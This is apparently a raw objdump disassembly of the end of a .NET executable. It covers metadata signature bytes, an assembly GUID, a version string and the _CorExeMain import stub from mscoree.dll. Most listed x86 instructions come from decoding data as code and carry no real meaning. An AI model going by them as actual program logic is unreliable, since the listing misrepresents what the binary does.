  40c74d:	01 12                	add    %edx,(%edx)
  40c74f:	80 ed 08             	sub    $0x8,%ch
  40c752:	07                   	pop    %es
  40c753:	00 02                	add    %al,(%edx)
  40c755:	01 0e                	add    %ecx,(%esi)
  40c757:	11 82 45 05 00 01    	adc    %eax,0x1000545(%edx)
  40c75d:	1d 0e 0e 07 00       	sbb    $0x70e0e,%eax
  40c762:	02 08                	add    (%eax),%cl
  40c764:	12 82 4d 08 08 00    	adc    0x8084d(%edx),%al
  40c76a:	03 08                	add    (%eax),%ecx
  40c76c:	0e                   	push   %cs
  40c76d:	0e                   	push   %cs
  40c76e:	11 81 b1 06 00 03    	adc    %eax,0x30006b1(%ecx)
  40c774:	1c 1c                	sbb    $0x1c,%al
  40c776:	1c 02                	sbb    $0x2,%al
  40c778:	04 00                	add    $0x0,%al
  40c77a:	01 02                	add    %eax,(%edx)
  40c77c:	1c 0b                	sbb    $0xb,%al
  40c77e:	00 06                	add    %al,(%esi)
  40c780:	0e                   	push   %cs
  40c781:	0e                   	push   %cs
  40c782:	0e                   	push   %cs
  40c783:	0e                   	push   %cs
  40c784:	08 08                	or     %cl,(%eax)
  40c786:	11 81 b1 06 00 01    	adc    %eax,0x10006b1(%ecx)
  40c78c:	12 80 a5 08 26 07    	adc    0x72608a5(%eax),%al
  40c792:	18 0e                	sbb    %cl,(%esi)
  40c794:	1c 12                	sbb    $0x12,%al
  40c796:	80 d9 12             	sbb    $0x12,%cl
  40c799:	82 31 0e             	xorb   $0xe,(%ecx)
  40c79c:	1c 1c                	sbb    $0x1c,%al
  40c79e:	0e                   	push   %cs
  40c79f:	1c 1c                	sbb    $0x1c,%al
  40c7a1:	08 1d 12 82 31 08    	or     %bl,0x8318212
  40c7a7:	1d 0e 1d 1c 1c       	sbb    $0x1c1c1d0e,%eax
  40c7ac:	1d 1c 1d 0e 08       	sbb    $0x80e1d1c,%eax
  40c7b1:	1d 0e 1c 08 08       	sbb    $0x8081c0e,%eax
  40c7b6:	08 06                	or     %al,(%esi)
  40c7b8:	07                   	pop    %es
  40c7b9:	02 18                	add    (%eax),%bl
  40c7bb:	12 80 ad 04 00 01    	adc    0x10004ad(%eax),%al
  40c7c1:	18 08                	sbb    %cl,(%eax)
  40c7c3:	05 00 02 02 18       	add    $0x18020200,%eax
  40c7c8:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40c7cb:	01 08                	add    %ecx,(%eax)
  40c7cd:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40c7d0:	01 09                	add    %ecx,(%ecx)
  40c7d2:	1c 04                	sbb    $0x4,%al
  40c7d4:	00 01                	add    %al,(%ecx)
  40c7d6:	08 1c 05 00 02 02 1c 	or     %bl,0x1c020200(,%eax,1)
  40c7dd:	1c 0b                	sbb    $0xb,%al
  40c7df:	07                   	pop    %es
  40c7e0:	07                   	pop    %es
  40c7e1:	18 1c 1c             	sbb    %bl,(%esp,%ebx,1)
  40c7e4:	1c 1c                	sbb    $0x1c,%al
  40c7e6:	12 82 35 0e 09 07    	adc    0x7090e35(%edx),%al
  40c7ec:	06                   	push   %es
  40c7ed:	0e                   	push   %cs
  40c7ee:	09 18                	or     %ebx,(%eax)
  40c7f0:	12 31                	adc    (%ecx),%dh
  40c7f2:	1c 1c                	sbb    $0x1c,%al
  40c7f4:	06                   	push   %es
  40c7f5:	00 01                	add    %al,(%ecx)
  40c7f7:	12 80 ad 08 0a 07    	adc    0x70a08ad(%eax),%al
  40c7fd:	06                   	push   %es
  40c7fe:	0e                   	push   %cs
  40c7ff:	09 18                	or     %ebx,(%eax)
  40c801:	1c 1c                	sbb    $0x1c,%al
  40c803:	12 80 a5 01 15 06    	adc    0x61501a5(%eax),%al
  40c809:	00 01                	add    %al,(%ecx)
  40c80b:	01 12                	add    %edx,(%edx)
  40c80d:	82 61 06 07          	andb   $0x7,0x6(%ecx)
  40c811:	02 02                	add    (%edx),%al
  40c813:	12 80 a5 01 02 06    	adc    0x60201a5(%eax),%al
  40c819:	20 01                	and    %al,(%ecx)
  40c81b:	1d 05 1d 05 0c       	sbb    $0xc051d05,%eax
  40c820:	00 05 01 12 82 4d    	add    %al,0x4d821201
  40c826:	08 12                	or     %dl,(%edx)
  40c828:	82 4d 08 08          	orb    $0x8,0x8(%ebp)
  40c82c:	05 20 01 01 1d       	add    $0x1d010120,%eax
  40c831:	05 06 20 01 01       	add    $0x1012006,%eax
  40c836:	11 82 7d 05 20 00    	adc    %eax,0x20057d(%edx)
  40c83c:	12 82 6d 08 20 03    	adc    0x320086d(%edx),%al
  40c842:	1d 05 1d 05 08       	sbb    $0x8051d05,%eax
  40c847:	08 13                	or     %dl,(%ebx)
  40c849:	07                   	pop    %es
  40c84a:	08 12                	or     %dl,(%edx)
  40c84c:	82 69 1d 05          	subb   $0x5,0x1d(%ecx)
  40c850:	1c 0e                	sbb    $0xe,%al
  40c852:	12 82 6d 1d 05 12    	adc    0x12051d6d(%edx),%al
  40c858:	82 71 1d 05          	xorb   $0x5,0x1d(%ecx)
  40c85c:	04 20                	add    $0x20,%al
  40c85e:	01 01                	add    %eax,(%ecx)
  40c860:	0a 04 07             	or     (%edi,%eax,1),%al
  40c863:	01 1d 0e 06 00 01    	add    %ebx,0x100060e
  40c869:	11 82 85 0e 04 20    	adc    %eax,0x20040e85(%edx)
  40c86f:	01 03                	add    %eax,(%ebx)
  40c871:	08 05 20 01 12 31    	or     %al,0x31120120
  40c877:	03 07                	add    (%edi),%eax
  40c879:	07                   	pop    %es
  40c87a:	04 0e                	add    $0xe,%al
  40c87c:	12 31                	adc    (%ecx),%dh
  40c87e:	08 08                	or     %cl,(%eax)
  40c880:	06                   	push   %es
  40c881:	10 01                	adc    %al,(%ecx)
  40c883:	01 08                	add    %ecx,(%eax)
  40c885:	1e                   	push   %ds
  40c886:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c889:	01 11                	add    %edx,(%ecx)
  40c88b:	48                   	dec    %eax
  40c88c:	06                   	push   %es
  40c88d:	20 01                	and    %al,(%ecx)
  40c88f:	11 41 11             	adc    %eax,0x11(%ecx)
  40c892:	41                   	inc    %ecx
  40c893:	04 07                	add    $0x7,%al
  40c895:	02 1c 08             	add    (%eax,%ecx,1),%bl
  40c898:	06                   	push   %es
  40c899:	07                   	pop    %es
  40c89a:	03 0e                	add    (%esi),%ecx
  40c89c:	12 31                	adc    (%ecx),%dh
  40c89e:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c8a1:	01 1d 05 05 20 01    	add    %ebx,0x1200505
  40c8a7:	0e                   	push   %cs
  40c8a8:	1d 05 05 07 02       	sbb    $0x2070505,%eax
  40c8ad:	0e                   	push   %cs
  40c8ae:	1d 1c 0e 07 07       	sbb    $0x7070e1c,%eax
  40c8b3:	1d 05 0e 12 82       	sbb    $0x82120e05,%eax
  40c8b8:	71 12                	jno    0x40c8cc
  40c8ba:	31 05 08 1d 05 09    	xor    %eax,0x9051d08
  40c8c0:	20 02                	and    %al,(%edx)
  40c8c2:	12 80 d9 0e 11 82    	adc    -0x7deef127(%eax),%al
  40c8c8:	8d 08                	lea    (%eax),%ecx
  40c8ca:	20 03                	and    %al,(%ebx)
  40c8cc:	01 0e                	add    %ecx,(%esi)
  40c8ce:	1c 11                	sbb    $0x11,%al
  40c8d0:	82 91 09 07 03 02 12 	adcb   $0x12,0x2030709(%ecx)
  40c8d7:	80 d9 12             	sbb    $0x12,%cl
  40c8da:	80 a5 06 20 01 12 80 	andb   $0x80,0x12012006(%ebp)
  40c8e1:	d9 0e                	(bad) (%esi)
  40c8e3:	0b 07                	or     (%edi),%eax
  40c8e5:	04 1d                	add    $0x1d,%al
  40c8e7:	05 12 80 d9 1c       	add    $0x1cd98012,%eax
  40c8ec:	12 80 a5 06 00 02    	adc    0x20006a5(%eax),%al
  40c8f2:	08 1d 05 08 09 20    	or     %bl,0x20090805
  40c8f8:	02 01                	add    (%ecx),%al
  40c8fa:	12 81 85 11 82 9d    	adc    -0x627dee7b(%ecx),%al
  40c900:	10 07                	adc    %al,(%edi)
  40c902:	09 1d 05 1c 1c 1d    	or     %ebx,0x1d1c1c05
  40c908:	05 1c 1c 1d 1c       	add    $0x1c1d1c1c,%eax
  40c90d:	1d 1c 1d 02 05       	sbb    $0x5021d1c,%eax
  40c912:	00 01                	add    %al,(%ecx)
  40c914:	1d 05 08 0d 07       	sbb    $0x70d0805,%eax
  40c919:	07                   	pop    %es
  40c91a:	1d 05 1c 1c 1c       	sbb    $0x1c1c1c05,%eax
  40c91f:	1d 1c 1d 1c 1d       	sbb    $0x1d1c1d1c,%eax
  40c924:	02 12                	add    (%edx),%dl
  40c926:	07                   	pop    %es
  40c927:	06                   	push   %es
  40c928:	12 82 69 1d 05 12    	adc    0x12051d69(%edx),%al
  40c92e:	82 71 1d 05          	xorb   $0x5,0x1d(%ecx)
  40c932:	12 82 6d 12 80 a5    	adc    -0x5a7fed93(%edx),%al
  40c938:	07                   	pop    %es
  40c939:	20 03                	and    %al,(%ebx)
  40c93b:	01 02                	add    %eax,(%edx)
  40c93d:	0e                   	push   %cs
  40c93e:	10 02                	adc    %al,(%edx)
  40c940:	06                   	push   %es
  40c941:	20 01                	and    %al,(%ecx)
  40c943:	01 11                	add    %edx,(%ecx)
  40c945:	82 a5 01 08 08 01 00 	andb   $0x0,0x1080801(%ebp)
  40c94c:	08 00                	or     %al,(%eax)
  40c94e:	00 00                	add    %al,(%eax)
  40c950:	00 00                	add    %al,(%eax)
  40c952:	1e                   	push   %ds
  40c953:	01 00                	add    %eax,(%eax)
  40c955:	01 00                	add    %eax,(%eax)
  40c957:	54                   	push   %esp
  40c958:	02 16                	add    (%esi),%dl
  40c95a:	57                   	push   %edi
  40c95b:	72 61                	jb     0x40c9be
  40c95d:	70 4e                	jo     0x40c9ad
  40c95f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c960:	6e                   	outsb  %ds:(%esi),(%dx)
  40c961:	45                   	inc    %ebp
  40c962:	78 63                	js     0x40c9c7
  40c964:	65 70 74             	gs jo  0x40c9db
  40c967:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c96e:	77 73                	ja     0x40c9e3
  40c970:	01 29                	add    %ebp,(%ecx)
  40c972:	01 00                	add    %eax,(%eax)
  40c974:	24 64                	and    $0x64,%al
  40c976:	31 32                	xor    %esi,(%edx)
  40c978:	65 35 64 30 39 2d    	gs xor $0x2d393064,%eax
  40c97e:	66 61                	popaw
  40c980:	33 66 2d             	xor    0x2d(%esi),%esp
  40c983:	34 34                	xor    $0x34,%al
  40c985:	62 30                	bound  %esi,(%eax)
  40c987:	2d 61 38 31 37       	sub    $0x37313861,%eax
  40c98c:	2d 61 61 39 38       	sub    $0x38396161,%eax
  40c991:	36 61                	ss popa
  40c993:	64 31 34 31          	xor    %esi,%fs:(%ecx,%esi,1)
  40c997:	39 61 00             	cmp    %esp,0x0(%ecx)
  40c99a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c99d:	00 07                	add    %al,(%edi)
  40c99f:	31 2e                	xor    %ebp,(%esi)
  40c9a1:	30 2e                	xor    %ch,(%esi)
  40c9a3:	30 2e                	xor    %ch,(%esi)
  40c9a5:	30 00                	xor    %al,(%eax)
  40c9a7:	00 d0                	add    %dl,%al
  40c9a9:	c9                   	leave
	...
  40c9b2:	00 00                	add    %al,(%eax)
  40c9b4:	ee                   	out    %al,(%dx)
  40c9b5:	c9                   	leave
  40c9b6:	00 00                	add    %al,(%eax)
  40c9b8:	00 20                	add    %ah,(%eax)
	...
  40c9ce:	00 00                	add    %al,(%eax)
  40c9d0:	e0 c9                	loopne 0x40c99b
	...
  40c9e2:	5f                   	pop    %edi
  40c9e3:	43                   	inc    %ebx
  40c9e4:	6f                   	outsl  %ds:(%esi),(%dx)
  40c9e5:	72 45                	jb     0x40ca2c
  40c9e7:	78 65                	js     0x40ca4e
  40c9e9:	4d                   	dec    %ebp
  40c9ea:	61                   	popa
  40c9eb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c9f2:	72 65                	jb     0x40ca59
  40c9f4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c9f8:	6c                   	insb   (%dx),%es:(%edi)
  40c9f9:	00 00                	add    %al,(%eax)
  40c9fb:	00 00                	add    %al,(%eax)
  40c9fd:	00 ff                	add    %bh,%bh
  40c9ff:	25 00 20 40 00       	and    $0x402000,%eax
